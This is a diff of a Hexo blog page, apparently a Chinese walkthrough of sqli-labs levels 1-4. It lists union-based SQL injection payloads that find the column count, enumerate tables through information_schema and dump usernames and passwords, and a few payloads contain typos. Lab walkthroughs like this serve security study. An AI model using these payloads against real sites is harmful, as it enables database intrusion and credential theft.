@@ -1,59 +1,69 @@
 <!DOCTYPE html>
-<html lang="zh-cmn-Hans">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <title>sqli-labs闯关1-4 | Willianir&#39;s home</title>
-  
-  
-  
-  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
-  
-<link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">
-
-  
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="baidu-site-verification" content="vvVgSQUzPU" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1"
+    />
+    <meta name="keywords" content="虎虎|博客|个人|utone|Utone|">
+    <meta name="description" content="骑士恨煎蛋，骑士恨孜然">
+    
+    <title>
+       sqli-labs闯关1-4 -  Willianir&#39;s home
+    </title>
+    
 <link rel="stylesheet" href="/css/style.css">
-
-<meta name="generator" content="Hexo 5.3.0"></head>
-
-<body>
-<div class="Shell">
-    <aside class='SideBar'>
-    <section class='avatar' style="background-image: url()">
-        <div class='av-pic' style="background-image: url()">
+ 
+    
+      <link rel="icon" href="/images/favicon.ico" />
+    
+  <meta name="generator" content="Hexo 5.3.0"></head>
+  <body>
+    <div id="container">
+      <div id="main-left">
+        <div id="introduce">
+          <div class="logo-worp">
+            <a href="/"><img class="logo" src="/images/logo.png" alt=""/></a>
+          </div>
+          <ul>
+            
+              <li><a href="/"> Home </a></li>
+            
+              <li><a href="/archives"> Archive </a></li>
+            
+              <li><a href="/about"> About </a></li>
+            
+              <li><a href="/atom.xml"> RSS </a></li>
+            
+            <li>
+              <img id="search-img" src="/images/search.svg" alt="search" />
+            </li>
+          </ul>
+           
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E4%B8%80%E3%80%81%E7%AC%AC1-2%E5%85%B3%EF%BC%9A%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="post-toc-number">1.</span> <span class="post-toc-text">一、第1-2关：基于错误的字符串&#x2F;数字型注入</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E4%BA%8C%E3%80%81%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="post-toc-number">2.</span> <span class="post-toc-text">二、第三关</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E4%B8%89%E3%80%81%E7%AC%AC%E5%9B%9B%E5%85%B3"><span class="post-toc-number">3.</span> <span class="post-toc-text">三、第四关</span></a></li></ol> 
+          
         </div>
-    </section>
-    <section class='menu'>
-        <div>Willianir&#39;s home</div>
-        
-        <ul>
-          
-            <a href="/" class="Btn">
-              <li>Home</li>
-            </a>  
-          
-            <a href="/archives/" class="Btn">
-              <li>Archive</li>
-            </a>  
-          
-        </ul>
-    </section>
-    <section class="media">
-        
-    </section>
-</aside>
-
-    <div class="container">
-        <div data-pager-shell>
-            <div>
-  <article class='ContentView'>
-    <header class='PageTitle'>
-        <h1>sqli-labs闯关1-4</h1>
+      </div>
+      <div id="main-right"><div id="post">
+    
+    <header class="article-header">
+        <h1>
+            sqli-labs闯关1-4
+        </h1>
     </header>
-
-    <section>
-      <h1 id="一、第1-2关：基于错误的字符串-数字型注入"><a href="#一、第1-2关：基于错误的字符串-数字型注入" class="headerlink" title="一、第1-2关：基于错误的字符串/数字型注入"></a>一、第1-2关：基于错误的字符串/数字型注入</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">2.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">3.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">4.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">5.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_shcema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">6.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-number">0x23</span>,username,password)),<span class="hljs-number">3</span> form users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+    
+    <div class="post-meta">
+        <time class="post-data" datetime="2021-06-05T07:48:17.550Z" itemprop="datePublished">
+            2021-06-05
+        </time>
+        
+        
+    </div>
+    
+    <div class="post-entry">
+        <h1 id="一、第1-2关：基于错误的字符串-数字型注入"><a href="#一、第1-2关：基于错误的字符串-数字型注入" class="headerlink" title="一、第1-2关：基于错误的字符串/数字型注入"></a>一、第1-2关：基于错误的字符串/数字型注入</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">2.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">3.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">4.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">5.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_shcema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">6.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-number">0x23</span>,username,password)),<span class="hljs-number">3</span> form users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
 <p>第一关在之前学习：联合查询，以及示例因此从第二关开始记录。<br>其实第一关和第二关差别不大：闭合符合的差别。</p>
 <p><strong>判断注入点</strong><br><img  src="https://img-blog.csdnimg.cn/20210312204500947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210312204517868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
 <p><img  src="https://img-blog.csdnimg.cn/20210312204536142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以判断为数字型注入<br><strong>确定属性列数目</strong><br>使用<code>?id=1 order by 数字 --+</code>不断尝试数字最大值<br><img  src="https://img-blog.csdnimg.cn/20210313094145196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看到列数最大为三</p>
@@ -105,49 +115,24 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 &quot;) union select 1,group_concat(concat_ws(0x23,username,password)),3 from users --+<br></code></pre></td></tr></table></figure>
 <p><img  src="https://img-blog.csdnimg.cn/20210313103803260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
 
-
-      
-
-    </section>
-    
-      <section class='ArticleMeta'>
-          <div>
-            发布于&nbsp;
-            <time datetime="2021-06-05T07:48:17.550Z" itemprop="datePublished">
-              2021-06-05
-            </time>
-          </div>
-          
-      </section>
-    
-    
-</article>
-
+    </div>
+    <!--畅言PC和WAP自适应版-->
   
-</div>
-
-            <footer>
-    <div>© 2021 - Willianhuanbian </div>
-    <div>
-        <span>
-            Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>
-        </span>
-        ,
-        <span>
-            Theme - <a target="_blank" rel="noopener" href="https://github.com/nameoverflow/hexo-theme-icalm">Icalm</a>
-        </span>
+</div></div>
     </div>
-</footer>
-
-        </div>
-    </div>
-</div>
-
-<script src="/js/pager/dist/singlepager.js"></script>
-
-<script>
-var sp = new Pager('data-pager-shell')
-
-</script>
-</body>
+    <div id="footer">骑士恨煎蛋，骑士恨孜然</div>
+    <img id="top" src="/images/up-circle.svg" alt="top" />
+    
+  </body>
 </html>
+<!-- 加载主题脚本文件 -->
+
+<script src="/scripts/utone.js"></script>
+
+
+<script type="text/javascript">
+  window.onload = function() {
+    scroll.init()
+    siteSearch.init()
+  }
+</script>
